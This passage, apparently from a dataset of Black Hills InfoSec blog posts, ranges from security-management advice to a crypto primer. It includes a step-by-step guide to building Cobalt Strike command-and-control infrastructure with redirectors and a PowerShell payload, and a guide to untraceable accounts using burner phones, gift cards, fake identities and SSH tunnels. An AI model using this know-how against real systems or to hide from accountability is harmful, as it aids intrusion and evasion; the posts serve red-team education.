improve the understanding with the C-Suite as to why security is important? See below for some of my ideas.\n \nThe People Problem\nAnyone who\u2019s spent more than five minutes in an InfoSec role has seen it. Most of us have restless nights because of it. More often than not, organizations simply don\u2019t have enough people trained to do the job effectively. This leads to employee burnout and disgruntlement. There isn\u2019t a more dangerous scenario that comes to my mind than a disgruntled security analyst with DA creds. At the C-Suite level, it\u2019s imperative that they understand running thin on staff ultimately leads to people walking out the door. An analogy that I will often use with any level of management is this, you have to staff an InfoSec team like a fire department. Now, this may mean that you have a team that isn\u2019t at 100% utilization 100% of the time and that\u2019s ok. When \u201cdown\u201d time exists, it creates the perfect opportunity for the staff to update and review procedural documentation, get familiar with a new technology suite, etc. You know, typically, those tasks that get pushed to the back burner when we are at 100% utilization. Getting back to my analogy, while there are often times firefighters are hanging out at the fire house, cleaning gear, washing the truck, and working out, when the call for a five-alarm fire comes through, the team is ready to go. Staffing an InfoSec team should be thought of in the same way.\n\nSecurity as a Differentiator\nA CEO should think of a robust security program as an opportunity to turn a \u201ccost center\u201d into a \u201cprofit center\u201d. While I would not suggest that a CEO release a press statement asserting their organization is infinitely secure and \u201chacker-proof\u201d the C-Suite should use their respective organizations investments in information security as an opportunity to establish an increased level of trust with their customers and suppliers and as opening to outpace their competitors. And this shouldn\u2019t stop with complying with the alphabet soup of regulations and compliance frameworks. It is imperative to demonstrate that an organization has internally established vulnerability management programs, submit themselves to routine internal and external pen tests, have a well-defined (and tested!) Incident Response program, etc., etc. These characteristics and capabilities can and should be leveraged to attract new business, and set that level of trust with clients, partner organizations, and future customers.\nNot Set & Forget Proposition\nProbably one of the larger misconceptions that plague the C-Suite is that if an organization is secure today, they\u2019ll be secure tomorrow. The sad reality that we all know all too well is that the threat landscape is more volatile than the stock market. It\u2019s our job to educate our C-Suite on that dynamic and harsh reality. More importantly, we have to help them understand that being proactive and having systems in place to combat an ever-changing threat landscape ultimately leads to better protection of the corporate enterprise and is one facet to help ensure business continuity and minimal interruption to revenue streams. Nothing will get the C-Suites attention quicker than walking them through multiple scenarios where the revenue stream is interrupted.\n\nTransparency\nIt\u2019s all too easy for us security folks to want to hide out in our cubicles and ruminate on how misunderstood our profession is amongst those at the top. But don\u2019t! work to open up the lines of communication with your organizations leadership. Work to implement policies that balance security with business objectives throughout your organization. Become a trusted advisor. Hear about a new software development project in the works at the water cooler, make some casual suggestions on some of the latest secure coding practices. Oftentimes these informal conversations can lead to a fundamental shift in the way an organization does business and can help establish the need to bring security to the table at the onset of any new project. Demonstrating that \u201cyou\u2019re on the team\u201d and are sensitive to the needs of the business can go a long way in establishing an InfoSec team as a \u201ctrusted insider\u201d, operating with the businesses best interests in mind. \nTraining\nWe get it, training dollars can be scarce, but it\u2019s an absolute necessity. How do we demonstrate a Return on Investment with training dollars? One way is by taking a train, the trainer approach which can go a long way in expanding knowledge throughout an enterprise. Staff members should come back from a training event and impart their knowledge to other members of the team. While sending a staff member to a week-long training course on any one technology is great. It\u2019s critical that knowledge doesn\u2019t walk out the door when that staff member gets hit by the proverbial bus. Having documented \u201chow-to guides\u201d on all of the tools in the toolshed are used really helps address the knowledge gap that\u2019s created when someone walks out the door. We should be sensitive to the fact that training is an investment that a company makes in us, we owe it to ourselves to not let those knowledge sit on the shelf and gather dust. Taking this approach helps justify the expense of future training opportunities to leadership. It\u2019s the butterfly effect.\nTools and Automation\nThe perception that a new application is all it takes to secure a company\u2019s IT infrastructure is shortsighted. While I don\u2019t know a single IT/InfoSec guy who doesn\u2019t like sitting in a dark room and configuring the newest firewall, IDS, DLP, you name it solution, the perception that your secure just because \u201cWe\u2019ve got an app for that\u201d is a dangerous one, and with new technology comes new challenges. InfoSec staff can help change that mentality by mapping out threat scenarios to each layer of the security onion. Being able to demonstrate to leadership what is negatively impacted when any one layer of defense is not in place helps to alleviate this. Having a security architecture in place, that ties to specific threat scenarios gives the C-Suite a much better understanding of their risk profile and shows where defensive gaps exist. It\u2019s on us to help steer them away from the \u201cWe\u2019ve got an app for that\u201d mentality and being able to communicate that to them succinctly and in a way that shows the negative impact to the bottom line is usually pretty effective.\nOwning the Risk\nMuch like the Captain of a ship is responsible for every aspect of operations on the ship. The C-Suite, and more specifically, the CEO are tasked with the responsibility for all operations within their respective organization, to include security. Turning a blind eye to the possibility of cyber intrusions is not only negligent, it\u2019s dangerous. It\u2019s important that they understand that it\u2019s not a matter of if they\u2019ll be attacked, it\u2019s a matter of when (if not all already) and how the organization reacts when an attack is identified. Having established security protocols may keep the companies name from becoming the lead-in story on the nightly news. And should that happen, the C-Suite needs to have a Public Relations plan in place for managing the media\u2026 That plan is just another layer of the security onion!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Small and Medium Business Security Strategies:  Part 3\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, Jordan Drysdale, INFOSEC 301 CRITICAL CONTROLS, it security, Jordan Drysdale, Small Business\"\nCreation Date: \"Thu, 15 Mar 2018 14:00:40 +0000\"\nJordan Drysdale //\n\nBlurb: A few of us have discussed the stress that small and medium business proprietors and operators feel these days. We want to help stress you out even more. Not really, but if you aren\u2019t worrying about IT security, you are probably doing it wrong. This series will run through some of the important controls that IT pros have mapped out for us. We are trying to present these in a way that you can accomplish them without dedicated IT staff.\n\nPart 1 - Introduction to SMB InfoSec Controls\n\nPart 2 - Inventory controls of your network hardware #CIS Critical Control 1#\n\nInventory Part 2, Software\n\nYou can do it!\n\nYou started this process by introducing your employees to a new year with an expectation that they are now participants in an information security transformation at your company. You should have gathered hardware inventory and contact information for the hardware your company owns and leases. You may have reached out to your various managed services vendors to find out what they know about your network.\n\nNext up: the software that keeps your business operational. As a small business owner, software maintenance can be a disaster. You thought an IRS audit was bad? Anyone ever received a Microsoft audit request form? Plain and simple, if you are running individually installed, licensed and managed Microsoft Office products, STOP. It's time to budget for new systems that are licensed for Windows 10 Pro and go get Office 365. This will put your life in an entirely new focus. This operating system will keep itself patched, updated and rebooted with minimal effort. The Office 365 product suite, once up and running will do the same, sans the reboots.\n\nIf you are reading these in order, the Hardware Inventory post included spreadsheet examples. Here\u2019s another one with prime examples of a software inventory list that most small and medium networks can start with:\n\nThis is going somewhere, and it will matter later. If the implementation of the first five from CSC 20 has you questioning your sanity, take a step back and another deep breath. This is the easy part. Each department has unique needs. Each department probably needs unique software. No one should have the privilege to install software at will. With a simple list of what software goes with which department, you no longer have to allow Bob, head janitor, full privilege to install who knows what on his system.\n\nThe goal is to limit exposure and maintain accurate software inventory to allow an organization to secure system configurations. If you don\u2019t know which departments need which software, then everyone gets to be an admin and a single successful phish is likely game over. This inventory management step is critical to ensure that no one on the network needs local administrator. If you don\u2019t know why this matters, if someone with local admin privilege clicks a link, the first adversary tactic is to get local administrator privilege. With this access, all authenticated sessions are visible and those passwords are compromised. This can lead to domain takeover and worse.\n\nIs Managed IT Services sounding better?\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"BHIS Caption This #2 Responses\"\nTaxonomies: \"Fun & Games, BHIScaptionthis, Clowns, GifTweets\"\nCreation Date: \"Fri, 16 Mar 2018 13:32:20 +0000\"\nIf you follow us on Twitter, you might have noticed we started #BHIScaptionthis on Fridays. There were so many good responses last week that we thought we\u2019d put them all here as well. Be sure to join us today for another round! One of the things we really love about this particular gif is that you kinda can't tell if he's scared/happy/excited/terrified/panicked or all of the above! Your great captions show the range of emotions he could be feeling. Thanks to everyone who participated!\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PSA: It's 10PM, Do You Know Where Your Lync Servers Are?\"\nTaxonomies: \"Author, Brian Fehrman, General InfoSec Tips & Tricks, Informational, external engagement, Lync, Lync server\"\nCreation Date: \"Mon, 19 Mar 2018 15:26:23 +0000\"\nBrian Fehrman//\n\nMicrosoft Lync servers have been a staple of my external engagements for the past six months or so. I have found a Lync server on all of those engagements. In most cases, these portals have long been forgotten; they are simply the discarded technology of yesteryear for many companies. I have found numerous instances where monitoring was in place for nearly every asset. Every asset...except the Lync server, that is.\nLync servers can provide many goodies for an attacker. All the same treasures that can be had with Outlook Web Access (OWA) portals can be had with Lync servers. This includes: internal-domain name disclosure, user enumeration via the AD timing attack, and even password spraying.\nThis blog post from TrustedSec has been my guiding light for my Lync adventures. Rather than write a crappier version of the great work that they did, I will simply point you to their blog:\nhttps://www.trustedsec.com/2017/08/attacking-self-hosted-skype-businessmicrosoft-lync-installations/\nEnjoy!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a Command & Control Infrastructure with Digital Ocean: C2K Revamped\"\nTaxonomies: \"C2, External/Internal, General InfoSec Tips & Tricks, How-To, InfoSec 201, InfoSec 301, Red Team, Red Team Tools, Social Engineering, C2, C2 Infrastructure, C2K, command and control, Digital Ocean\"\nCreation Date: \"Thu, 22 Mar 2018 14:11:41 +0000\"\nLee Kagan* //\n\nExpanding upon the previous post in this series, I decided to rewrite C2K (find it here) to change its behavior and options for the user.\n\nIn this post we will walk through the changes to C2K as well as re-deploy a demo C2 infrastructure with all the new features. It is worth noting that not everything demonstrated is automated or part of the C2K script. There are also more capabilities being added into C2K that are currently in-progress.\n\nC2K a.k.a. Command and Control Kit, is a bash script I put together to speed up the process of repeat C2 builds and tasks. The new design allows for users to easily and quickly remove, add or edit the features they require to get the job done. Currently C2K provides the following capabilities:\n\nDeploy Cobalt Strike team servers\n\nDeploy Apache mod_rewrite redirectors for HTTP C2 instances\n\nAdd HTTPS support to HTTP C2 instances\n\nConfigure firewall rules for C2 traffic\n\nLockdown SSH access to C2 instances\n\nConfigure terminal logging\n\nConfigure Logwatch on C2 instances\n\nIn this post, we will use all of the above features as well as some manual additions such as:\n\nIntegrate Cobalt Strike beacon events into Slack\n\nIntegrate Digital Ocean performance alerts into Slack\n\nUse Digital Ocean doctl CLI to create global infrastructure firewalls\n\nIn order to use C2K (and the manual alerting setup), there are some requirements you will need before using it:\n\nDigital Ocean account\n\nDigital Ocean API key\n\nCobalt Strike license\n\nSlack\n\nCreate Slack app for incoming webhook\n\nDomain and DNS management (i.e. GoDaddy)\n\nThe New C2K Walkthrough\n\nLet\u2019s take a look at the code and how C2K can be used.\n\nThe C2K pack contains 3 items which can pulled from GitHub:\n\nc2k.sh \u2013 The main script to execute\n\nHTTPsC2DoneRight.sh \u2013 script from @Killswitch_GUI to setup HTTPS support\n\nsshd_config \u2013 custom SSHD configuration template for locking down SSH access\n\nNOTE: You are responsible for your own copy of Cobalt Strike. Leave the unpacked archive in the same folder as the above once you\u2019ve downloaded everything.\n\nGo ahead and open up c2k.sh and let\u2019s take a look inside.\n\nEverything in the c2k.sh script is broken down into sections, buckets and functions to allow the user to quickly and easily modify any of the content. In the above image you\u2019ll need to set the following variables:\n\nDOTOKEN \u2013 place your Digital Ocean API key between the quotes\n\nNEWUSER \u2013 place a username you will be using to log into the new droplets with over SSH between the quotes\n\nEverything for here on in is broken down by functions. This makes it very easy to add/remove/edit commands and features.\n\nThe function \u201cfunc_getDependencies\u201d is a basic update and install some requirements. In the odd event you don\u2019t have python installed, it will add that too. \u263a\n\nThe function \u201cfunc_createUser\u201d will create the new user for SSH access and add that account to the sudoers group.\n\nThe function \u201cfunc_setupSSH\u201d will make the necessary changes to setup SSH access for the new user and move the existing key already on the droplet over to that user (the existing SSH key is what you\u2019re using to login to the new droplet over root for the first time).\n\nThe function \u201cfunc_createDroplets\u201d is where the droplet creation magic happens. It leverages the Digital Ocean API. In the above image I\u2019ve shown how to create multiple droplets at once. If you wish to create one at a time, just remove the second and third blocks starting with curl.\n\nYou\u2019ll need to set the \u201cYOUR_DROPLETS_HOSTNAME\u201d field for each droplet. You can also set the region, size and image as you require (this has only been tested on Ubuntu 16.04). Finally, you\u2019ll need to add your SSH key fingerprint in the \u201cYOUR_SSHKEY_FINGERPRINT\u201d field. This can be obtained in the Digital Ocean control panel when you add your SSH key (as we\u2019ll see later).\n\nBecause this script revolves around using Cobalt Strike, the functions in the above image are all related to it but can be modified for your preferred framework i.e. MSF or Empire.\n\nThe function \u201cfunc_getCSDependencies\u201d installs the Java requirement for Cobalt Strike. The function \u201cfunc_installCobaltStrike\u201d unpacks and runs the installer which will prompt you for your license. The function \u201cfunc_getMalleable\u201d will pull down Malleable C2 profiles into the unpacked Cobalt Strike directory. The function \u201cfunc_addHTTPSSupport\u201d will run the HTTPsC2DoneRight.sh script.\n\nIt is important to restrict connectivity to your team servers. In the above image, there\u2019s a simple function called \u201cfunc_createFirewall\u201d to setup what ports are accessible. This is not a rock solid firewall so it is encouraged to restrict access as needed (NOTE: we will also be looking at a global infrastructure firewall with doctl later on).\n\nWhen selecting the HTTP redirector option in C2K, the function in the above image, \u201cfunc_createHTTPRedirector\u201d makes use of an excellent script courtesy of @n0pe_sled. This script will automate the process of configuring your HTTP redirection instance. It is highly encouraged to visit the authors GitHub page (https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup) to see all the options available.\n\nIn the above example, the function will pull down the script as well as Malleable C2 profiles. The script supports using Malleable profiles for redirection although in the above example it is not used. The important fields to edit before using are the \u201c\u2014block_url\u201d and \u201c\u2014allow_url\u201d. Add a domain which you wish to send traffic to that should not touch your team server or does not meet the redirection criteria. Then add the C2 domain that traffic should be proxied to (this is your HTTP C2 instance).\n\nFinally, the last function is \u201cfunc_installDefensiveTools\u201d. This function is a starting point to add some defensive measures into your C2 instances. First it installs lterm, a great utility once again from @Killswitch_GUI that records console activity and writes it out to file. It will also install Logwatch and email you reports on what has been happening on your servers. In the above image, you will need to edit the 2 fields for your email address (shown as your@email.com). You can also adjust any of the settings above for your preferred means to be notified, when, and what level of detail.\n\nC2K Preparation\n\nBefore executing C2K, let\u2019s prepare everything we need to begin creating the infrastructure. Here\u2019s the plan:\n\nDomain(s) \u2013 I\u2019ll be using ilikedemos[.]com for this demonstration\n\nNeed to set the A records for our different hosts\n\n4 droplets \u2013 these will be our simulated C2 instances\n\nPayload host \u2013 Cobalt Strike instance for hosting downloads, scripts, implants etc.\n\nHTTP host \u2013 Cobalt Strike instance for receiving reverse HTTP beacons\n\nHTTP redirection host \u2013 Apache mod_rewrite instance for proxying\n\nHTTPS host \u2013 Cobalt Strike instance receiving reverse HTTPS beacons\n\nSSH Key \u2013 will create a new SSH key and add to Digital Ocean\n\nSlack channel and webhook\n\nCobalt Strike and Slack integration Aggressor script from @bluscreenofjeff (https://github.com/bluscreenofjeff/AggressorScripts)\n\nLet\u2019s begin.\n\nStarting with Digital Ocean, log in to your account and we\u2019ll obtain the API key and add an SSH key to our profile.\n\nClick \u201cAPI\u201d at the top of the page and create a new API key if you do not already have one by clicking \u201cGenerate New Token\u201d.\n\nGive your token a new name. When it\u2019s created, be sure to note down the key as it will only be displayed to you once. If you lose it, you\u2019ll need to generate a new token.\n\nNext, in your profiles security settings section, create a new SSH key by clicking \u201cAdd SSH Key\u201d or note down your existing SSH keys fingerprint.\n\nNow would be a good time to update c2k.sh and add your Digital Ocean API key and SSH fingerprint.\n\nWe can now run the c2k.sh script and create the droplets for our C2. I\u2019m going to create 4 droplets with the following settings:\n\nAll will be in nyc3 for this demo\n\nAll will be 2gb although I recommend more for actual operations\n\nHostnames for each will be:\n\npayload.ilikedemos.com\n\nhttp.ilikedemos.com\n\nhttpred.ilikedemos.com\n\nhttps.ilikedemos.com\n\nSelect option 1 to automatically deploy the droplets you configured inside the script.\n\nOnce finished running, check your Digital Ocean droplets page and you should see the newly created droplets.\n\nNow would be a good time to update your A records for the domain(s) you will be using with the C2 infrastructure.\n\nNext, we need to transfer the C2K folder contents over to each machine (you actually don\u2019t need to transfer Cobalt Strike over to the redirector). In the image below repeat the SCP process for each droplet.\n\nOnce you\u2019re finished copying over the C2K pack to each droplet, SSH in normally as root which will use the SSH key to login.\n\nBefore running the C2K script on the droplets I like to set a root password. Because we\u2019ll be logging in over SSH later with the new user in the sudoers group, should you want to directly elevate to root you\u2019ll have a password to do so (although not really necessary).\n\nNot all of the 4 droplets in this demonstration require the same selections in c2k.sh to be run. Here\u2019s a breakdown of what I\u2019ll be executing on each.\n\nPayload host \u2013 Install Cobalt Strike, install logging and defensive tools.\n\nHTTP host \u2013 Install Cobalt Strike, install logging and defensive tools.\n\nHTTPS host \u2013 Install Cobalt Strike, install HTTPS support, install logging and defensive tools.\n\nBe sure to have your A records set before running HTTPsC2DoneRight.sh\n\nNote this script will use by default the amazon.profile Malleable C2 profile with HTTPS support. Be sure to edit this or run your HTTPS team server with that profile\n\nOnce done stop Apache from running otherwise it will conflict with Cobalt Strike from standing up a listener.\n\nHTTP redirector host \u2013 Install HTTP redirection, install logging and defensive tools.\n\nBe sure to set the apache_mod_rewrite_setup flags in the c2k.sh script before running this option\n\nAlso make note of the settings in the sshd_config template. There\u2019s a custom SSH port and username set that you will need to change. SSH port is up to you but be sure the NEWUSER variable in c2k.sh matches the AllowUser directive in the sshd_config template. Once the c2k.sh script completes you will have to login over SSH once you disconnect using newusername@droplet_address -p 7654 (or whatever custom port you chose).\n\nOnce the script completes with the selections mentioned above, disconnect and log back in with the new user account.\n\nOnce you\u2019ve finished all the c2k.sh script options for each of your droplets, let\u2019s add some more monitoring and alerting.\n\nFirst, let\u2019s add Digital Ocean Slack integration for droplet performance monitoring. In your Digital Ocean control panel, click \u201cMonitoring\u201d at the top navigation.\n\nThis should be blank to start with but also pay attention to the bottom of the above image. There\u2019s a command we\u2019ll need to execute on each droplet we want to monitor performance on. Before creating a new policy, execute that command (will integrate this into c2k.sh script soon).\n\nOnce done, click \u201cCreate alert policy\u201d.\n\nSelect a metric to alert on such as CPU then the threshold settings you desire. Add your droplets by name or tag, then select \u201cConnect Slack\u201d under the alerts section. You\u2019ll need to authenticate to your Slack account and select a channel you wish to receive alerts to. Once done, click \u201cCreate alert policy\u201d. The images below show the result on Digital Ocean and Slack.\n\nGreat. Now we\u2019ll integrate alerts from Cobalt Strikes beacon into the same Slack channel as well. You\u2019ll need to create a new Slack app and note down the webhook to add into Cobalt Strike. This process can be followed along with the excellent post from @bluescreenofjeff here: https://bluescreenofjeff.com/2017-04-11-slack-bots-for-trolls-and-work/\n\nGo to your Slack accounts app page and select \u201cCreate an App\u201d.\n\nGive your app a name and the Slack channel you wish to receive alerts in the click \u201cCreate App\u201d.\n\nIn the next page that will appear select \u201cIncoming Webhooks\u201d.\n\nOn the Webhooks page you\u2019ll need to toggle it on in order to activate the feature.\n\nOnce enabled, towards the bottom of the page you\u2019ll want to select and create a new Webhook. Click \u201cAdd new Webhook to Workspace\u201d and in the popup window select the same channel (or different if you prefer) in Slack to receive the alerts to.\n\nOnce done, your new Webhook URL will be displayed. Make a note of this as you\u2019ll need it to enter into the Aggressor script for Cobalt Strike.\n\nNow all that\u2019s left is to test out our C2 infrastructure and make sure it\u2019s all working as expected.\n\nAfter connecting my Cobalt Strike client to all the active team servers, I add the eventlog-to-slack.cna Aggressor script and enter the appropriate settings.\n\nThis integration can be confirmed in the appropriate Slack channel.\n\nNext I created two listeners. One on the HTTP host which is also set to have its beacons call back to the HTTP redirector. The second, on the HTTPS listener which is straight connection back to it (no redirection).\n\nOn the payload host, I hosted a PowerShell web delivery script which stages to the HTTP host which will be proxied through the redirector.\n\nAfter executing the PowerShell payload on a victim machine, everything successfully stages through the redirector and access is obtained via the HTTP host.\n\nBy tailing the Apache logs on the redirector we can also see the redirector in action.\n\nFinally, I\u2019m spawning a new beacon from the access we have on the HTTP host to call back to the HTTPS host.\n\nGreat. Looks like everything is now fully operational and we also have our Slack notifications of new beacons that came in.\n\nGlobal Firewall\n\nLastly, I wanted to come back to the doctl utility mentioned at the very beginning. This is a CLI tool installed locally on your physical host (but doesn\u2019t have to be) that allows you to access and configure nearly every option that Digital Ocean provides.\n\nWhat I had in mind for this was to use the Digital Ocean firewall feature to create a firewall that restricts access to and from the entire infrastructure. One reason for this is to set up rules that allow only you and your customers for example to touch the infrastructure.\n\nWhen you first run doctl you\u2019ll need to authenticate using your API key.\n\nAfter that, all the options are now available.\n\nIn the image above, you can see how with a few commands you can query various information from your Digital Ocean account.\n\nLet\u2019s create a firewall that we will then apply to all droplets. The idea here is to demonstrate how you can restrict traffic not only to and from your instances, but also between them should the need arise.\n\nIn the above image I\u2019m creating a demo firewall called \u201cc2-infra-firewall\u201d and defining the inbound and outbound rules. For the inbound, you would want to change the 0.0.0.0/0 to your originating IP and perhaps the IP address(es) that could originate from who you are testing.\n\nA few other advantages of restricting traffic to such a degree would be if your target is on a different network than the blue team. Also, restricting internet noise and potential unwanted visitors from touching your C2.\n\nOnce you\u2019ve created the firewall you can list it and its settings and start adding droplets to it globally. You\u2019ll just need the firewall ID and droplet IDs as seen in the above image. These setting are also reflected in your Digital Ocean control panel.\n\nClosing Thoughts and Mentions\n\nBefore wrapping up this post a few thoughts on the design above:\n\nFrom an OPSEC perspective, hosting your entire C2 on a single provider can prove problematic should the entire range for Digital Ocean get blocked.\n\nAlso regarding OPSEC, having all your C2 traffic call to a single domain is not great either. Mix it up and spread it out \u263a\n\nThe eventlog-to-slack Aggressor script may not be something you or your customers are happy with if certain and potentially sensitive information is posted to Slack. Take this into consideration.\n\nThere\u2019s been some Twitter debates lately regarding attack infrastructure on cloud VPS and systems you will not actually have true control over and the ethics of this. It\u2019s a valid point and something to consider so be sure you and your customers are aware of the how and where their data will be protected\n\nC2K is far from a finished project. There\u2019s many new additions I\u2019m still working on adding such as DNS team servers and redirectors, more defensive settings and phishing instance with SMTP relay automation.\n\nI\u2019d like to give some special thanks to those who have authored the tools I\u2019ve integrated into C2K as well as some people who have influenced me a lot and helpful resources:\n\n@Killswitch_GUI for lterm and HTTPsC2DoneRight.sh\n\n@bluscreenofjeff for creating the Red Team Infrastructure Wiki\n\nBlackHills Infosec staff for allowing me to post on their awesome blog.\n\n@armitagehacker for Cobalt Strike\n\nThank you all so much for reading and happy hacking \u263a\n\n_________\n \n*Lee Kagan is a guest blogger from RedBlack Security. He is an offensive security professional with almost a decade in IT and InfoSec. A penetration tester, red teamer and currently lead for RedBlack Security\u2019s Rogue Team specializing in threat and adversary emulation in Toronto, Canada. Lee\u2019s focus on the team and in practice is offensive infrastructure support, post-exploitation of Windows and Active Directory environments, PowerShell and C# weaponization.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Non-Attrib Starterpack!\"\nTaxonomies: \"Author, External/Internal, Jordan Drysdale, Phishing, Red Team, Burner Devices, Digital Ocean, Jordan Drysdale, non-attrib, privacy, Red Team, Tracfone\"\nCreation Date: \"Mon, 26 Mar 2018 15:37:47 +0000\"\nJordan Drysdale //\nLet\u2019s start this post at Walmart. Yes, the visit may be attributable against the purchaser via security camera footage retrieved by warrant, so hand your wife/husband/confidant/whomever a stack of untraceable cash. The first thing to snag is a new burner phone. This one seems acceptable for our purposes:\n\nWait though, did we define our purposes? Do we need to? Are we hiding from a tyrannical regime? Check. Are we hiding from ad networks trying to group us under demographic profiles that allow injected web responses hijacked through advanced techniques and directed marketing? Check. Are we trying to hide from a customer contractual engagement where attribution is a goal of their SOC? Check. If you happen to be interested in any of these things, this write-up might be for you.\nThe next purchase item is an activation card. The data inclusion is important because you may need a hotspot in a pinch for internet access.\n\nThe last physical purchase item will be your Visa gift cards, small denomination. $25 works well because Digital Ocean\u2019s costs are low. A server is around five bucks a month for a lightweight one with minimal hardware (these make perfect tunnel proxy servers).\n\nNext up, head to your favorite local coffee shop and order something. Wear a hoodie, because it is required, or not. Jump on the wireless from your burnable laptop. Seriously, perma-cookies are easy to track. If you have used this laptop for anything associated with you, your new non-attrib accounts are hosed.\n\nCheck out tracfone.com, they will allow new fone activations without an account. You may be concerned that the coffee shop could be attributable... and it might be. McDonald's has this weird thing where their backbone connections may drop you out of one their primary datacenters. You could get lucky there too and not even be on your local city carrier networks.\nThe first account required will be a new email account for activation and two-factor purposes. Google\u2019s mail product, \u201cGmail\u201d if you will, is a fantastic platform. If you haven\u2019t seen this product, I recommend checking it out!\nAt this point, you also need to consider where on earth you want your new identity to reside. Another interesting note here is that the ad-networks behave differently depending on where you purchase your Digital Ocean node. For example, you do not have access direct access to Axiom, BeenVerified and various other \u201chuman data\u201d aggregators in the European Union because of their privacy laws.\nEither way, head over Fake Name Generator! This site will give you a pre-packaged identity for non-attributable use.\n\nNext, let\u2019s head over to Paypal, because the lovely people at Paypal will process payments ( <3 ) for you against your prepaid Visa gift cards. You will need a new account, your Gmail account logged in for verification, and your gift cards in hand.\nLast on my must-have list for the non-attribution starterpack is a Digital Ocean account. They will allow you to deploy servers in London, Singapore, Amsterdam, Toronto, et cetera. Guess what? Now, with your coffee shop wi-fi connection, you can disappear! Be sure your browser is configured for a proxy. With the standard SSH tunnel command, you can drop on to the internet wherever your node was deployed:\n\nssh -D 9999 -fCqNp 8228 user@fqdn.tld\n(D = local listening socket, the other flags are some SSH magic and the -p is your remote SSH port)\nDid I mention GoDaddy allows domain purchases via non-attrib? No? They do, though this is a bit advanced for the starterpack.\nCheers, and safe transit!!!!\n______\nFollow Jordan on Twitter @rev10d\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Hard Part of the Alphabet\"\nTaxonomies: \"Fun & Games, BHIS, Black Hills Information Security\"\nCreation Date: \"Thu, 29 Mar 2018 15:19:06 +0000\"\nMelisa Wachs//\n\nMany of you have met John, so I thought you\u2019d enjoy this posh little gem I dug up. This picture was taken in our first home, and although I don\u2019t remember this very moment, I do have a fond memory from around this time, that many of y\u2019all may be able to relate.\nOur mother, Rita, was not just kind and gentle, but also firm. Family bonds were important and she often reminded us that, \u201cthe longest relationship you\u2019ll ever have is with your siblings, not even your spouse or children. It\u2019s a gift, so cherish and foster it.\u201d (This reminder usually came after we had normal childhood squabbles.)\nSo, the eve of my first day of Kindergarten, when John took an unorthodox approach to \u201cpreparing me for school,\u201d she allowed the chaos and mess that accompanied my lesson for the sake of building a relationship.\nIn essence, John turned our entire main level of the house into a giant obstacle course. Every movement through the course was not just a physical challenge, but an intellectual one as well. If I wasn\u2019t able to properly complete the intellectual aspect, I had to start the physical component over. For example, I remember counting to 20 while weaving over and under the kitchen chairs as they lined the hall.\nMy admitted weakness, though, was the dreaded ..l, m, n, o, p\u2026 section of the ABC\u2019s. He was grueling! Imagine doing cartwheels - on the couch - then jumping off the end arm while trying to focus on which letter was next - 26 times.\nIt was tiring. It was frustrating. I remember being very dizzy. But, I also remember the distinct look on his face and feeling of accomplishment when I finally made it. John is a natural teacher. He understood, even then, how to \u201cmake things stick.\u201d\nI\u2019m so glad our mother knew when a memory was more important than a mess, that she always encouraged us to stick close. Other people might cringe at having their siblings and family members work alongside them, but not John. We may have our disagreements from time to time but at the end of the day I continue to look up to him and admire all that he\u2019s done.\nWe hope you have a very blessed Easter with your families!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Intro to Cryptocurrency and How to Secure Your Coins\"\nTaxonomies: \"Author, Beau Bullock, How-To, Informational, Bitcoin, cryptocurrencies, Cryptocurrency, cryptocurrency wallet\"\nCreation Date: \"Tue, 03 Apr 2018 15:06:17 +0000\"\nBeau Bullock//\n\nOverview\nThis blog post is meant to serve as a basic introduction to the world of cryptocurrencies. With cryptocurrencies making their way into mainstream news outlets I am getting asked more and more about it. People that I had mentioned Bitcoin to back in 2013 are coming out of the woodwork to ask about it, now that it's getting so much attention. This blog is going to cover how to get your first coins and how to securely store them.\n\nDisclaimer: I am not a financial advisor and this is not financial advice. Do your own research before buying cryptocurrency.\nPossibly two of the most important aspects of cryptocurrencies are that there are many different ones, and that not all of them are in fact meant to be \u201ccurrencies\u201d. As of today, March 27, 2018 coinmarketcap.com lists 1,589 different cryptocurrencies. A large number of these coins are meant to improve on current monetary systems. Bitcoin being at the forefront has dominated the market, but there are plenty of others that are attempting to achieve a similar goal. Litecoin, Ethereum, and Ripple are each similar in that they are attempting to solve global issues with the transfer of money. Many of the other coins (and tokens) have very different goals and technologies backing them though.\n\nMany people who are jumping into cryptocurrency are mainly doing so because of the speculative nature of it, and they are hoping to make some gains off of investment. I think that there is definitely potential for monetary gains, but more importantly there is potential for technological gains. Specifically, \u2018blockchain\u2019 is the underlying piece of technology that Bitcoin and other cryptocurrencies are running on top of. More on the blockchain in another post\u2026 let's get to the part where we buy some coins!\nJoin an Exchange and Purchase Coins\nCoinbase by far is the most popular exchange used by many of those just getting into cryptocurrency. At the present date you can sign up on Coinbase and buy either Bitcoin, Ethereum, Litecoin, or Bitcoin Cash with a debit card or bank transfer. If you are looking to quickly jump into cryptocurrency I\u2019d recommend signing up here and buying your first coins.\n\nOne thing to keep in mind is that for all cryptocurrencies you don\u2019t have to buy them in whole number format, meaning you can buy very small fractions of each coin. For example, you don\u2019t have to buy one (1) Bitcoin to own Bitcoin. You can purchase Bitcoin out to the eighth decimal place like this: 0.00000001 BTC. Fun fact: 0.00000001 BTC is referred to as \u201c1 Satoshi\u201d. This means that if you want to buy $20 worth of Bitcoin you can.\nHow you became interested in cryptocurrency can drive what coins you wish to purchase. Bitcoin has recently had very high transaction fees along with long wait times for transacting coins making it not the best for quick payments. If you are interested in the using cryptocurrency as a daily-use payment method you might be more inclined to acquire something like Ethereum or Litecoin instead of Bitcoin, since their fees are lower and are relatively fast. If you are interested in maintaining anonymity and are more privacy focused, then coins such as Monero, ZCash, or Verge are for you. These coins will require you signing up on a different exchange such as Binance to trade Bitcoin or Ethereum for these. If you are more interested in a store of value, Bitcoin might be the choice for you as it has historically been the center of the cryptocurrency world. When Bitcoin price rises so do others, when it drops everything else does.\nSecure Your Coins\nRule #1 of cryptocurrency is: Don't leave your coins on an exchange.\nOk, so what does that mean? Coinbase is a web application. This means that your private keys are controlled by them. Private keys are exactly what they sound like. They are the digital equivalent to the key to your bank account. If Coinbase gets hacked all your coins will be stolen. 